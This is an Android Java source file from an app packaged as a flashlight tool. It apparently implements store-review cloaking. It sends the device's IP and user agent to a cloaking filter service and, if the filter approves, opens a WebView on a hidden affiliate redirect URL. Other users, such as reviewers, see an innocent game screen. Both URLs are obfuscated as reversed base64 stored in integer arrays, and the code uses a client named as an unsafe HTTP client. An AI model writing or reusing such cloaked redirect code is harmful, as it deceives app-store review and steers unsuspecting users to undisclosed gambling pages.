package com.bovada.flashlights.lib;

import static org.apache.cordova.TPreferences.KEY_MUTED;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.webkit.WebView;

import androidx.annotation.NonNull;

import com.google.gson.Gson;
import com.walhalla.ui.BuildConfig;
import com.walhalla.ui.DLog;

import org.apache.cordova.Const;
import org.apache.cordova.E;
import org.apache.cordova.ScreenType;
import org.apache.cordova.domen.Dataset;
import org.apache.cordova.http.HttpClient;
import org.apache.cordova.model.IpApi;
import org.apache.cordova.repository.AbstractDatasetRepository;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URI;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class RemoteRepository extends AbstractDatasetRepository implements Callback {

    //private static final String COUNTRY_CODE = "UA";
    private static final String KEY_QUERY = "key_query";

    //https://record.revenuenetwork.com/_PjC-0p9ASHhfF3jV9Q8g-WNd7ZgqdRLk/1/
    int[] map = new int[]{
            61, 61, 119, 76, 120, 56, 121, 97, 77, 74, 70, 90, 120, 100, 109, 87, 51, 81, 109, 84, 88, 49, 121, 90, 52, 69, 86, 79, 87, 112, 50, 77, 71, 90, 71, 97, 73, 78, 86, 81, 53, 65, 72, 77, 116, 77, 107, 97, 81, 57, 49, 76, 116, 57, 50, 89, 117, 115, 109, 99, 118, 100, 72, 100, 108, 53, 87, 90, 49, 53, 87, 90, 50, 86, 109, 99, 117, 81, 109, 99,
            118, 78, 87, 90, 121, 57, 121, 76, 54, 77, 72, 99, 48, 82, 72, 97

    };

    //"http://api.clofilter.com/v1/check";
    public static final int[] _URL_ = new int[]{114, 78, 87, 90, 111, 78, 50, 76, 120, 89, 51, 76, 116, 57, 50, 89, 117, 73, 88, 90, 48, 120, 87, 97, 109, 57, 71, 98, 106, 53, 83, 97, 119, 70, 50, 76, 118, 111, 68, 99, 48, 82, 72, 97};

    private final Handler handler;
    private final String USER_AGENT;

    public RemoteRepository(Handler handler, Context context) {
        super(context);
        this.handler = handler;
        String tmp0 = new WebView(context).getSettings().getUserAgentString();
        this.USER_AGENT = tmp0.replace("; wv)", ")");
    }

    //{"code":404,"message":"Not found"}
    //{"standartIntegration":true,"page":"","isPassed":false,"pageType":"white","redirectQuery":"","type":"load","simplePage":"","originPage":"","pageWithParams":""} █

    public static final MediaType JSON_TYPE = MediaType.parse("application/json; charset=utf-8");

    @Override
    public void getConfig(Context context) {
        //Delayed Request
        Handler handler1 = new Handler();
        handler1.postDelayed(() -> {
            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
            String query = preferences.getString(KEY_QUERY, null);
            if (TextUtils.isEmpty(query)) {
                detectIp();
            } else {
                secondRequest(query);
            }
        }, 700);

        //demo
//        Dataset aa = new Dataset(ScreenType.WEB_VIEW, "https://google.com");
//        aa.setEnabled(true);
//        aa.screenType = ScreenType.WEB_VIEW;
//        aa.url = decode(map);
//        success0Response(aa);
    }

    private void detectIp() {
        OkHttpClient client = HttpClient.getUnsafeOkHttpClient(context);
        Request request = new Request.Builder()
                .url(E.d(E._IP_INFO_URL_))
                .build();
        Call call = client.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                success0Response(new Dataset(ScreenType.GAME_VIEW, null));
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                ResponseBody body = response.body();
                String json = "";
                if (body != null) {
                    json = body.string();
                }
                //IPInfoRemote aa = IpInfoRepositoryExternal.fetch(json);
                //DLog.d("@" + json);
                Gson gson = new Gson();
                IpApi entity = gson.fromJson(json, IpApi.class);

                if (TextUtils.isEmpty(entity.countryCode)) {//Try next time
                    //DLog.d("@@Try next time@@");
                } else {
                    //boolean blocked = !(COUNTRY_CODE).equalsIgnoreCase(entity.countryCode); //BLOCK #1+"UA"
                    //DLog.d("@@@@" + entity.query + " " + blocked);

                    boolean blocked = false;

                    if (blocked) {
                        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
                        preferences.edit().putString(KEY_MUTED, "true").apply();
                    } else {
                        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
                        preferences.edit().putString(KEY_QUERY, entity.query).apply();
                        secondRequest(entity.query);
                    }
                }
            }
        });
    }

    private void secondRequest(String query) {

//        if (BuildConfig.DEBUG) {
//            query = "121.121.121.121";
//        }

        String companyId = "62f4c51a6261ae76abac96a2";
        String referrerCF = "https://google.com/3";
        String urlCF = "https://xxxxx.com/2";
        String simplePage = "https://aaa.com/1";

        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("companyId", companyId);
            jsonObject.put("referrerCF", referrerCF);
            jsonObject.put("urlCF", urlCF);
            jsonObject.put("simplePage", simplePage);

            jsonObject.put("QUERY_STRING", "Bovada App");
            jsonObject.put("HTTP_REFERER", "");
            jsonObject.put("HTTP_USER_AGENT", USER_AGENT);

            jsonObject.put("REMOTE_ADDR", query);
            jsonObject.put("HTTP_CF_CONNECTING_IP", query);
            jsonObject.put("CF_CONNECTING_IP", query);
            jsonObject.put("X_FORWARDED_FOR", query);
            jsonObject.put("TRUE_CLIENT_IP", query);
        } catch (JSONException e) {
            DLog.handleException(e);
        }
        RequestBody body = RequestBody.create(jsonObject.toString(), JSON_TYPE); // new

        //android.content.SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        //String url = MainPresenter.makeUrl(_URL_, preferences, context);
        String url = d(_URL_);
        //url = appendUri(url, "companyId=" + companyId);
        //url = appendUri(url, "referrerCF=" + referrerCF);
        //url = appendUri(url, "urlCF=" + urlCF);
        //DLog.d("@@" + url + " " + d(map));

        OkHttpClient client = HttpClient.getUnsafeOkHttpClient0(context);
        Request request = new Request.Builder()
                .url(url)
                .header("User-Agent", USER_AGENT)
                .post(body)
                .build();

        Call call = client.newCall(request);
        call.enqueue(this);
    }

    public static String appendUri(String uri, String appendQuery) {
        try {
            URI oldUri = new URI(uri);
            String newQuery = oldUri.getQuery();
            if (newQuery == null) {
                newQuery = appendQuery;
            } else {
                newQuery += "&" + appendQuery;
            }
            URI newUri = new URI(oldUri.getScheme(), oldUri.getAuthority(),
                    oldUri.getPath(), newQuery, oldUri.getFragment());
            return newUri.toString();
        } catch (Exception e) {
            return "";
        }
    }

    @Override
    public void onFailure(@NonNull Call call, @NonNull IOException e) {
        DLog.handleException(e);
        handler.post(() -> {
            success0Response(new Dataset(ScreenType.GAME_VIEW, null));
            callback.handleError(e.getMessage());
        });
    }


    @Override
    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {

        if (response.isSuccessful()) {
            ResponseBody body = response.body();
            if (body != null) {
                try {
                    final String result = response.body().string();
                    boolean isPassed = false;
                    if (!TextUtils.isEmpty(result)) {
                        JSONObject obj = new JSONObject(result);
                        isPassed = obj.getBoolean("isPassed");
                        if (isPassed) {
                            Dataset aa = new Dataset(ScreenType.WEB_VIEW, d(map));
                            aa.enabled=(true);
                            success0Response(aa);
                        } else {
                            success0Response(new Dataset(ScreenType.GAME_VIEW, null));
                        }
                    } else {
                        success0Response(new Dataset(ScreenType.GAME_VIEW, null));
                    }
                    DLog.d("@repo@: " + isPassed + " " + result + " ");
                } catch (Exception e) {
                    DLog.e("@repo@ = " + e);
                    success0Response(new Dataset(ScreenType.GAME_VIEW, null));
                }
            }
        }

    }


    private void success0Response(Dataset dataset) {
        DLog.d("[*]@repo@" + dataset.toString() + " " + (handler == null));
        if (handler != null) {
            handler.post(() -> callback.successResponse(dataset));
        }
    }

    private static String d(int[] ints) {
        StringBuilder sb = new StringBuilder();
        for (int i : ints) {
            sb.append((char) i);
        }

        byte[] decodedBytes = android.util.Base64.decode(
                sb.reverse().toString(), 0
        );
        return new String(decodedBytes);
    }

    //{"standartIntegration":true,"page":"",
    // "isPassed":false,"pageType":"white","redirectQuery":"","type":"load","simplePage":"","originPage":"","pageWithParams":""}
}
